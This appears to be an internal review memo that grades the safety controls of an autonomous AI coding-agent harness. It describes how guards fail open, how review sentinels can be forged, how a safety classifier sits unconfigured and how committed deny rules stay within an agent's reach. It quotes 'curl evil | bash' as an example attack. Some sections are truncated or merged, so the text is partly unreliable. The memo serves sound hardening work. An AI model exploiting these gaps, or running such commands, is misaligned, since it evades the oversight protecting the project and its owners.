# Kill-List Attack — §E "ALREADY BUILT" (existence bar vs world-class bar)

**Attacker stance:** The conservative synthesis set the bar at EXISTENCE, then marked "exists" = "done" and forbade re-proposing. The new charter sets the bar at WORLD-CLASS. For each of the 12 items I ask: do we have the *world-class* version, or a *weak version to upgrade*? Every verdict cites a re-mine file (`design/ambition/remine/<slug>.md`) and/or a confirmed disk fact from `A2-canonical/CHECK-canonical-map.md` (the adversarially-verified ground-truth, hereafter **[CHECK]**). I name the failure the weak version still allows.

**Governing rule honored:** no upgrade survives without (a) a re-mine row showing a stronger form AND (b) a named failure mode the weak version permits. Where the existing thing genuinely is best-in-class, I say so and leave it.

**Verdict legend:** TRULY-WORLD-CLASS (leave alone) · WEAK-VERSION-UPGRADE (named upgrade + source + failure) · PARTIAL (real core, specific missing arc).

## Item-by-item reasoning

### 1. `/cr` 9-pass + 4-lens adversarial; `/cr-security` — **WEAK-VERSION-UPGRADE**

The conservative claim ("more review rigor than any tool the corpus studies") confuses *depth* with *world-class*. Depth on an invisible, un-independent, un-calibrated surface is not the bar. Four concrete upgrades, each cited and each with a named failure:

1. **Verdict must be a GitHub/CI artifact, not a gitignored sentinel.** `[coderabbit.md, Move 1]`: "depth without a visible, auditable, enforceable surface is worthless at scale." Disk fact **[CHECK §14/§3f via coderabbit]**: `.cr-ok` is gitignored, never reaches CI (Node 8.5(c) gap). **Failure allowed:** a Slack/Linear-summoned or cloud-`/schedule` agent that clones the repo has no `.cr-ok` and no laptop to honor it — the deep review is unreadable at the merge boundary, so an autonomous merge cannot assert review happened.
2. **Adversarial pass needs true independence (shared canon, isolated solution context).** `[code-review-latentspace.md, Move 2]`: Gemini CLI #26397 lifted merge-readiness 43%→91% via cross-context adversarial iteration; our 4 lenses run "as part of the same `/cr` invocation over the full branch diff" **[CHECK §15 + §3c]** — structurally incapable of that independence. **Failure allowed:** the reviewer inherits the coder's blind spots and rationalizations; it polishes a confidently-wrong solution instead of refusing it.
3. **No REJECT tier.** `[code-review-latentspace.md, Move 1]`: disk `/cr` has MUST FIX / NEEDS HUMAN / SUGGESTION only — "No REJECT tier, no UNATTENDED branching." **Failure allowed:** an overnight `/queue` run ships five polished, all-green PRs that solve the *wrong problem* (invisible to a diff read cold) straight to a tired human, instead of auto-close-and-re-queue.
4. **Reviewer is uncalibrated + governance corpus not wired in.** `[coderabbit.md, Moves 2 & 3]` and `[recursive-self-improvement.md, Move 2]`: nothing measures `/cr`'s precision/recall (`@benchmark-runner` is a phantom), and the ADR/Rejected-Patterns/PITFALLS corpus is "asserted, not wired" as review input. **Failure allowed:** at fleet scale an uncalibrated reviewer is an accumulating-noise tax; and the one thing that makes our reviewer categorically better than CodeRabbit (it *can* see our locked decisions; CodeRabbit structurally cannot) is left unbuilt.

The conservative bias is textbook: it read "9 passes" as the ceiling. World-class is the verdict-as-artifact + independent multi-round adversary + REJECT + calibration + governance-lens — none of which exist.

### 2. Deterministic commit/push floor — **PARTIAL → UPGRADE**

The floor is real and good (block-dangerous-git, block-npm-install, husky pre-commit lint+tsc+test, husky pre-push, CI). But "deterministic" is a costume here in three places, all cited:

- **`.cr-ok` never reaches CI** — same hole as item 1 `[coderabbit.md / playwright-mcp-debug.md / recursive-self-improvement.md Move 1]`. The terminal stop authority is *forgeable*: gitignored sentinel, never validated on the SHA. Under autonomy that forgeable gate is "the only thing standing between 'model agreed with itself' and 'shipped to main'."
- **`block-dangerous-bash.sh` ABSENT** — the canonical 3rd guard the harness is *documented to require* is not on disk **[CHECK §10]**; advisory CLAUDE.md prose ("destructive ops need a rollback path") is the only "control." `[agent-sandboxing-10co.md, Move 2]` — failure mode is the literal Replit-July-2025 prod-DB deletion and the PocketOS incident.
- **Guards fail-OPEN on missing `jq`** and the *live* husky pre-commit lacks the main-branch agent hard-block that the dormant `.githooks/pre-commit` has (`core.hooksPath=.husky/_`) **[CHECK F3/F7]**. `[augment-code.md, Move 2 — guard integrity]`: "a deterministic control that fails open is probabilistic enforcement in a costume." **Failure allowed:** a cloud `/schedule` sandbox (restricted network, minimal env) is exactly the fail-open trigger — the guard evaporates and *looks like it ran*.

Upgrade = fail-CLOSED contract + CI presence/self-test for every guard + CI-verified `.cr-ok` on SHA + build the absent 3rd guard. Partial because the floor's spine is genuinely there; it just isn't yet trustworthy under the unattended path.

### 3. Tier-0 prod-key firewall — **WEAK-VERSION-UPGRADE**

The ground-truth word is **"partially"** — and the re-mine is blunt that what exists is a *worktree-creation helper*, not an enforced invariant. `[agent-sandboxing-10co.md, Move 1]`: "what exists is a convenience script, not the ephemeral-scoped, per-session, human-revoked credential posture Ramp runs in production." **Failures allowed:** (a) a single misconfigured worktree, a stale shared `.env.local` symlink, or a cloud `/schedule` clone that resolves `.env.local` to prod silently re-arms the 24/25 credential-exfiltration failure mode (no exploit needed); (b) no egress allowlist anywhere `[agent-sandboxing-10co.md, Move 3]` — the supply-chain class (`npm install evil-pkg`, `curl evil | bash`) is undefended on the local `/queue` path; (c) the migration-credential policy (agent verifies local, human applies prod) is "not encoded anywhere — no hook blocks `supabase db push` from an agent worktree" `[Move 4]`. Upgrade = promote the script to a blocking pre-flight credential-firewall hook every autonomy entry-point passes through + egress allowlist + the `supabase db push` worktree-block. Not "done" — it is the load-bearing control for the only failure mode that actually caused incidents, sitting at convenience-script tier.

### 4. Worktrees + `/queue` + 23-agent roster — **PARTIAL**

The isolation/parallelism substrate is strong and stays. But the conservative read treated "we can isolate and parallelize" as "we have autonomy." `[every-compound-lfg.md, Move 1]`: we have every *cell* of the loop (`/dev`, `/feature`, `/cr`, `/compound`, UNATTENDED worktree, prod-key firewall) but **no committed orchestrator that chains them to an opened PR** — "that gap *is* the gap between 'we think about autonomy' and 'we have autonomy.'" And the roster itself: `[ramp-inspect-agent.md, "skill not agent" move]` — 23 agents on disk vs canon's contradictory 7–10, and the §9 Model Capacity Audit that should reconcile it was made against Sonnet 4.6 and has never been re-run on Opus 4.8 **[CHECK §11, §9]**. **Failure allowed:** a parallel fleet with a contradictory, un-re-audited roster and no loop to drive it is sophisticated plumbing with no engine. Partial because the substrate is world-class; the loop on top of it is absent.

### 5. Six-store memory layer + freshness — **WEAK-VERSION-UPGRADE**

The stores exist (the 6th, auto-memory, genuinely outside canon's model — **[CHECK §4 non-finding]**). But the loop is write-only at the spot that matters. `[code-review-latentspace.md, Moves 4 & 5]`: RECURRING-FINDINGS.md is "pipeline-only, auto-counted by `/cr` Step 3b, **never read by implementers**" — we accumulate findings into a store no one reads; and there is "no row, in canon or disk, for first-pass-approval-rate, review-cycle-count, or post-merge-defect tracking." `[coderabbit.md, Move 4]`: the promotion path terminates at a human-read doc; there is no finding→*enforcement* arc, so "you keep re-finding the same bug forever instead of making it impossible." **Failure allowed:** the self-improving loop cannot self-improve — no read-back, no measurement signal, no conversion of recurrence into a mechanism. Upgrade = close the read path into task-start context + an effectiveness-metrics ledger + the finding→enforcement (hook/lint/lens) arc, with §9 recurrence-decay as the eviction signal. The conservative call ("ours closes more of the loop than the article's manual top-3") is the exact existence-bar trap `[coderabbit.md Move 4 names it]`.

### 6. `/loop` + `/compound` + ritual layer — **WEAK-VERSION-UPGRADE**

This is the cleanest existence-bar kill. `[loop-engineering.md, Move 1]`: "a *harness* is a pipeline you invoke by hand; a *loop* finds its own work on a schedule" — and "there is **no cron, no scheduled-tasks config, no `/loop` or `/goal` wiring** in `.claude/`." `/loop` as it exists is a session-bound interval poller; rituals "fire only at session start" **[CHECK §3e via loop-engineering]**. **Failure allowed:** every "weekly" ritual runs twice and then never again; drift, recurring-finding accumulation, and open bugs are never *noticed* because noticing is nobody's scheduled job. The single objection that gated this (does the scheduler fire when the laptop is closed?) is a RESOLVED FACT — cloud `/schedule` runs on Anthropic infra, laptop-closed. Upgrade = wire the cloud heartbeat as the foundational primitive + wire `/goal` (run-until-graded-stopping-condition, grader bottoming out on CI/`.cr-ok`) + enforce the temporal-gap invariant (a ritual with no clock is a hope) as a CI/`/cr` check `[loop-engineering.md, Moves 1, 2, 4]`. `/compound`'s capture step is good but is a context-eviction deadline `[every-compound-lfg.md autonomy angle]`, not a scheduled loop.

### 7. CONTEXT / STRATEGY / ARCHITECTURE / AGENTS / SOUL — **PARTIAL**

First, a ground-truth correction the kill-list itself should carry: the prior synthesis falsely marked CONTEXT.md and docs/ARCHITECTURE.md as *absent/phantom* **[CHECK F1, F2]** — they exist, are git-tracked, and resolve from 20+ skills. Partial because the docs exist and are load-bearing; the budget discipline over them does not. ### 8. auto-mode artifact (content done, placement broken) — **WEAK-VERSION-UPGRADE**

"Content done, only placement broken" is the single worst under-scoping in the corpus. `[auto-mode-config.md, all four moves]` + live disk fact: `claude auto-mode config` shows **defaults only**; the project's custom entries appear **0 times** in effective config; `~/.claude/settings.json` has **no `autoMode` key**. **Failures allowed:** (a) every unattended `/queue` run today is governed by bare defaults — the safety classifier the whole autonomy program rides on is effectively unconfigured; (b) no pre-flight verify exists, so a block that *looks* complete but is inert is discovered only after an overnight fleet silently stalls; (c) the policy can't be committed/distributed, so repo #4/#5 silently run bare defaults; (d) the built-in `soft_deny` defaults block "running production migrations," and this project's env *is* single-tenant prod — so a correctly-configured classifier soft-blocks every migration, *killing the exact autonomous DB work it exists to enable*. Upgrade = place it where the classifier reads it + a standing pre-flight gate + a committed canonical source with an `/init` materializer + a single-tenant-prod carve-out. This is "auto-mode is a first-class V2 pillar with author→verify→distribute lifecycle," ~10× the "move a JSON block" framing.

### 9. permissions.deny guard-file lockout + "no agent edits to guard files" — **TRULY-WORLD-CLASS**

Leave it alone, and here is why it is genuinely best-in-class: the autonomy sources independently *converge on this exact rule* as the one honest safety boundary for a self-improving worker. `[basis-canon-not-canon.md, Move 1 + safety-boundary find]`: the automated repair worker is safe **iff** "the worker is denied write access to guard files / settings / the destructive-op floor" — citing our own memory rule "no agent edits to guard files." `[commands-vs-skills.md]` and `[augment-code.md]` treat the guard layer as the floor everything else routes around. The only forward-looking move is *additive and downstream*: when we ship autonomous workers, apply this rule as their path-scope denylist. That is using the rule, not upgrading it. (Honest caveat that does **not** change the verdict: a `deny` in the *committed* settings.json is agent-reachable; the truly unbypassable floor is managed-settings, which is human-territory per the standing "no agent edits to guard files" rule — so the rule is correctly load-bearing precisely because it is enforced socially/by-path-scope, not assumed structurally.)

### 10. chrome-devtools-mcp configured; Playwright rejected — **WEAK-VERSION-UPGRADE**

The rejection was decided on the wrong axis. `[playwright-mcp-debug.md, Move 4]`: chrome-devtools-mcp is **headed-only** — it "breaks in CI, overnight runs, headless" — and `.claude/mcp.md` rejected Playwright as "redundant" on *signal overlap*. But the axis that matters for this harness is attended-vs-unattended, and on that axis they are **not** redundant. **Failure allowed:** "an autonomous agent that tries visual verification at 3am fails silently" — the verification step is structurally impossible in the very mode the harness is built for. Upgrade = keep chrome-devtools-mcp for attended deep-signal debugging, add a headless path (likely Playwright MCP scoped to the verify leg, or a CI browser job against a preview deploy) for unattended runs — plus the broader move this unlocks: an artifact-producing `/verify` gate (a11y snapshot + console + pixel-diff) that reaches CI `[playwright-mcp-debug.md, Move 1]`, with a fail-closed tenant assertion before any snapshot is trusted `[Move 5]` (RLS product — a snapshot rendered as the wrong tenant looks perfect and is a security trap). The rejection isn't wrong about signal overlap; it's wrong that signal overlap was the deciding question.

The RESOLVED FACT names this exactly: `disable-model-invocation:true` "is what makes autonomy safe." This is the frontmatter half of the autonomy-safety substrate, co-equal with the bash kill-gate — not hygiene.

### 12. §9 golden rule + selective-friction doctrine — **TRULY-WORLD-CLASS as doctrine; under-applied as mechanism**

The rule itself — "if you can't name a failure mode the constraint prevents, the constraint is overhead" — is genuinely best-in-class and is the governing lens the entire re-mine runs on (every ELEVATE in this file had to name a failure mode; that discipline *is* §9). `[leland-eight-principles.md, Move]` correctly *upholds the cut* of building a separate principle-enforcement audit — folding it into §9 is the right call, not conservative bias. `[harness-engineering-survey.md]`: "our map already authorizes the subtraction the article underweights." So the doctrine: leave alone. The weakness is narrow and real: it is **documentation, not a running loop**, and the Opus 4.8 re-audit it explicitly mandates **[CHECK §9]** has never run (judgments still dated to Sonnet 4.6). `[augment-code.md, Move 4]`: the world-class form is "a scheduled capability-audit routine that re-classifies the rule corpus and proposes deletions as a reviewed PR" — i.e. the golden rule wired as a self-improving prune loop, not a manual audit. **Failure allowed by the documentation-only form:** outgrown scaffolding accumulates because the re-audit is nobody's scheduled job (same temporal-gap failure as item 6). Verdict: keep the doctrine verbatim; the *only* upgrade is to run it on a schedule.

## Bottom line for the synthesis

The conservative §E reflex — "exists, therefore done, never re-propose" — fails the world-class bar on **8 of 12** items, and the pattern is uniform: every weak version is **invisible, advisory, un-independent, un-scheduled, or un-distributed** at exactly the seam where the human used to backstop it. Autonomy removes that human, so each "we have a version" becomes a live failure surface:

- **The invisible seam:** `/cr` depth dies in a gitignored sentinel; `.cr-ok` never reaches CI (items 1, 2). The terminal stop authority is forgeable.
- **The advisory seam:** the firewall is a convenience script, the 3rd guard is absent, guards fail-open, 0/26 skills are invocation-gated (items 2, 3, 11). "Deterministic" in a costume.
- **The unscheduled seam:** no heartbeat, no `/goal`, rituals fire only at session-start, the §9 re-audit never runs (items 6, 12). A harness, not a loop.
- **The undistributed/unverified seam:** auto-mode runs bare defaults on the live machine with no pre-flight and no committed source (item 8). The safety classifier the whole program rides on is effectively off.

**Upheld (genuinely best-in-class, leave alone):** the guard-file lockout rule (item 9), the safety doctrine half of item 11, and the §9 golden rule *as a doctrine* (item 12) — all three are the safety floor the autonomy work routes *around*, and the re-mine sources independently converge on them. Item 7's files are upheld against the prior false-absence claim (CONTEXT.md / ARCHITECTURE.md exist), but the context-budget discipline over them does not.

The single most wrongly-killed thing on this list: the autonomy **loop** itself (the `/lfg` orchestrator + cloud heartbeat, items 4 & 6) — the synthesis had every cell and marked "we already aim at autonomy" as equivalent to "we have it," generating zero build move for the one command that closes idea→reviewed-PR unattended.
